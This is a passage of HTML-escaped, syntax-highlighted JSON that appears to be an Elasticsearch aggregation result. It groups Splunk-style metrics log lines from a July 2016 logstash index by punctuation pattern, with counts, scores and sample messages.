  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;aggregations&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;group&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count_error_upper_bound&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;sum_other_doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;93355&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=,_=.,_=,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cpu_seconds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.2037623779471813&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;115831&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMJbLjo3PexoUujh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:17:33.776 +0800 INFO  Metrics - group=pipeline, name=indexerpipe, processor=index_thruput, cpu_seconds=0.000000, executes=111, cumulative_hits=161675&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=,_=,_=,_=,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;87058&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;87058&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;largest_size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;75663&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.835574761742766&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;75663&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;75663&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMJbLjo3PexoUuj9&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:17:02.780 +0800 INFO  Metrics - group=queue, name=nullqueue, max_size_kb=500, current_size_kb=0, current_size=0, largest_size=1, smallest_size=0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=\&quot;\&quot;,_=.,_=.,_=.,_=,_=.,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26317&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26317&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;max_age&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26317&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;7.224805514306611&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45119&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26317&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
